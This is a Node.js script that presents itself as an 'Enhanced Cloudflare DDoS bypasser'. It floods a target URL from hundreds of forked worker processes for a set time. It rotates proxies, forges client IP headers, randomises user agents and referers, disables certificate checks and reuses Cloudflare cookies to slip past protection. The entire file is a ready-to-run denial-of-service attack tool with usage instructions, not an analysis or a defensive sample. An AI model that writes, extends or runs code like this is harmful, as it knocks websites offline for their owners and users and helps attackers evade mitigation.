const cloudscraper = require('cloudscraper');
const https = require('https');
const http = require('http');
const randomstring = require("randomstring");
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');
const cluster = require('cluster');
const os = require('os');
const tls = require('tls');
const url = require('url');

// Enhanced Configuration
const CONCURRENCY = os.cpus().length * 100; // Increased worker multiplier
const REQUEST_RATE_LIMIT = 1500; // Higher request rate
const MAX_RETRIES = 5; // More retry attempts
const SOCKET_TIMEOUT = 15000; // Longer timeout for HTTPS

const httpStatusCodes = {
    OK: 200,
    BAD_REQUEST: 400,
    NOT_FOUND: 404,
    INTERNAL_SERVER: 500
};

const userAgents = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
'Mozilla/5.0 (Android 8.0.0; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3317.0 YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; LG-X240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710FQ Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; F3211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 6.0; LG-K350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-C5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36'

];

const referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://youtube.com/",
    "https://github.com/",
    "https://www.pinterest.com/search/?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/"

];

const paths = [
    "",
    "/",
    "/index.html",
    "/home",
    "/search",
    "/api/v1/test",
    "/wp-admin",
    "/admin"
];

const tlsVersions = [
    "TLS_method",
    "TLSv1_1_method",
    "TLSv1_2_method",
    "TLSv1_3_method"
];

const ALPNProtocols = [
    'h2', 
    'http/1.1', 
    'spdy/3.1', 
    'http/1.2', 
    'http/2', 
    'http/2+quic/43', 
    'http/2+quic/44',
    'h3',                          // HTTP/3 standard
    'h3-29',                       // Draft 29
    'h3-28',                       // Draft 28
    'h3-27',                       // Draft 27
    'h3-T051',                     // Temporary Google variant
    'h3-Q050',                     // QUIC draft 50
    'h3-Q046',                     // QUIC draft 46
    'h3-Q043',                     // QUIC draft 43
    'quic',                        // Generic QUIC
    'hq',                          // HTTP/0.9 over QUIC
    'doq',                         // DNS over QUIC
    'doq-h3',                      // DNS over HTTP/3
    'h3-fb',                       // Facebook variant
    'h3-uber',                     // Uber variant
    'h3-23',                       // Draft 23
    'h3-25'                        // Draft 25
];

let proxies = [];
let currentProxyIndex = 0;
let requestCount = 0;
let lastResetTime = Date.now();

function checkRateLimit() {
    const now = Date.now();
    if (now - lastResetTime >= 1000) {
        requestCount = 0;
        lastResetTime = now;
    }
    return ++requestCount <= REQUEST_RATE_LIMIT;
}

function generateFakeIP() {
    const ranges = [
        () => `1.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `5.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `45.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `80.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `104.${randomByte(16, 31)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `172.${randomByte(16, 31)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `192.168.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `216.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`
    ];
    return ranges[Math.floor(Math.random() * ranges.length)]();
}

function randomByte(min = 0, max = 255) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomReferer() {
    return referers[Math.floor(Math.random() * referers.length)];
}

function getRandomPath() {
    return paths[Math.floor(Math.random() * paths.length)];
}

function getRandomTLSVersion() {
    return tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
}

function loadProxies() {
    try {
        console.log("[+] Loading proxies from proxy.txt...");
        const proxyFile = fs.readFileSync('proxy.txt', 'utf8');
        proxies = proxyFile.split('\n')
            .map(proxy => proxy.trim())
            .filter(proxy => proxy.length > 0)
            .map(proxy => {
                if (!proxy.startsWith('http://') && !proxy.startsWith('https://') && !proxy.startsWith('socks://')) {
                    return `http://${proxy}`;
                }
                return proxy;
            });
        console.log(`[+] Loaded ${proxies.length} proxies from file`);
    } catch (err) {
        console.log('[!] Error loading proxy.txt:', err.message);
        process.exit(1);
    }
}

function getNextProxy() {
    if (proxies.length === 0) return null;
    currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
    return proxies[currentProxyIndex];
}

function createRequestOptions(url, path, cookie, useragent, referer) {
    const ip = generateFakeIP();
    const rand = randomstring.generate({
        length: 10,
        charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    });
    
    const options = {
        url: url + path,
        headers: {
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'cookie': cookie,
            'Origin': 'http://' + rand + '.com',
            'Referer': referer,
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'X-Client-IP': ip,
            'X-Requested-With': 'XMLHttpRequest'
        },
        gzip: true,
        timeout: 10000,
        secureProtocol: getRandomTLSVersion(),
        ALPNProtocols: ALPNProtocols,
        followRedirect: true,
        followAllRedirects: true,
        maxRedirects: 5
    };
    
    const proxyUrl = getNextProxy();
    if (proxyUrl) {
        if (proxyUrl.startsWith('socks')) {
            options.agent = new SocksProxyAgent(proxyUrl);
        } else {
            options.proxy = proxyUrl;
        }
    }
    
    return options;
}

function createSecureContext() {
    return tls.createSecureContext({
        minVersion: 'TLSv1.1',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_128_GCM_SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES128-GCM-SHA256'
        ].join(':'),
        honorCipherOrder: true,
        ALPNProtocols: ALPNProtocols
    });
}

function createHttpAgent(targetUrl) {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === 'https:';
    
    const agentOptions = {
        keepAlive: true,
        maxSockets: 50,
        timeout: SOCKET_TIMEOUT,
        rejectUnauthorized: false // Bypass SSL verification
    };
    
    if (isHttps) {
        agentOptions.secureContext = createSecureContext();
        return new https.Agent(agentOptions);
    }
    return new http.Agent(agentOptions);
}

function createRequestOptions(targetUrl, path, cookie, useragent, referer) {
    const ip = generateFakeIP();
    const rand = randomstring.generate(10);
    const parsedUrl = new URL(targetUrl);
    const isHttps = parsedUrl.protocol === 'https:';
    
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: path || parsedUrl.pathname,
        method: 'GET',
        headers: {
            'Host': parsedUrl.hostname,
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Referer': referer,
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'Cookie': cookie,
            'Upgrade-Insecure-Requests': '1'
        },
        agent: createHttpAgent(targetUrl),
        timeout: SOCKET_TIMEOUT
    };
    
    // Add proxy support
    const proxyUrl = getNextProxy();
    if (proxyUrl) {
        if (proxyUrl.startsWith('socks')) {
            options.agent = new SocksProxyAgent(proxyUrl, {
                timeout: SOCKET_TIMEOUT,
                secureContext: isHttps ? createSecureContext() : undefined
            });
        } else {
            options.proxy = proxyUrl;
        }
    }
    
    return options;
}

function executeRequest(targetUrl, options) {
    return new Promise((resolve) => {
        const parsed = new URL(targetUrl);
        const isHttps = parsed.protocol === 'https:';
        const module = isHttps ? https : http;
        
        const req = module.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data
                });
            });
        });
        
        req.on('error', (e) => {
            console.log(`[!] Request error: ${e.message}`);
            resolve(null);
        });
        
        req.on('timeout', () => {
            req.destroy();
            console.log('[!] Request timeout');
            resolve(null);
        });
        
        req.end();
    });
}

async function makeRequest(targetUrl, time) {
    if (!checkRateLimit()) {
        await new Promise(resolve => setTimeout(resolve, 100));
        return;
    }
    
    let retries = 0;
    const path = getRandomPath();
    const referer = getRandomReferer();
    const useragent = getRandomUserAgent();
    
    while (retries < MAX_RETRIES) {
        try {
            // First bypass Cloudflare if needed
            const cloudflareOptions = createRequestOptions(targetUrl, path, '', useragent, referer);
            delete cloudflareOptions.headers.Cookie;
            
            const cfResponse = await executeRequest(targetUrl, cloudflareOptions);
            const cookie = cfResponse?.headers['set-cookie'] || '';
            
            // Then make the actual request
            const options = createRequestOptions(targetUrl, path, cookie, useragent, referer);
            const response = await executeRequest(targetUrl, options);
            
            if (response) {
                console.log(`[+] ${targetUrl} - Status: ${response.statusCode} - IP: ${options.headers['X-Forwarded-For']}`);
            }
            break;
        } catch (error) {
            retries++;
            if (retries === MAX_RETRIES) {
                console.log(`[!] Max retries reached for ${targetUrl}: ${error.message}`);
            }
        }
    }
}

if (process.argv.length <= 2) {
    console.log("\nEnhanced Cloudflare DDoS bypasser with proxy support\n");
    console.log("Usage: node CFBypass.js <url> <time> [proxy]");
    console.log("Example: node CFBypass.js https://example.com 60");
    console.log("Optional: Add 'proxy' argument to enable proxy rotation from proxy.txt");
    process.exit(-1);
}

const targetUrl = process.argv[2];
const attackTime = parseInt(process.argv[3]) || 60;
const useProxies = process.argv[4] === 'proxy';

if (useProxies) {
    loadProxies();
}

if (cluster.isMaster) {
    console.log(`Launching ${CONCURRENCY} workers...`);
    // Enable load balancing
    cluster.schedulingPolicy = cluster.SCHED_RR;
    for (let i = 0; i < CONCURRENCY; i++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        console.log('[+] Attack completed, shutting down workers');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, attackTime * 1000);
} else {
    const attackInterval = setInterval(() => {
        makeRequest(targetUrl, attackTime);
    }, 10);
    
    process.on('exit', () => {
        clearInterval(attackInterval);
    });
}

process.on('uncaughtException', (err) => {
    console.log('[!] Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (err) => {
    console.log('[!] Unhandled Rejection:', err.message);
});
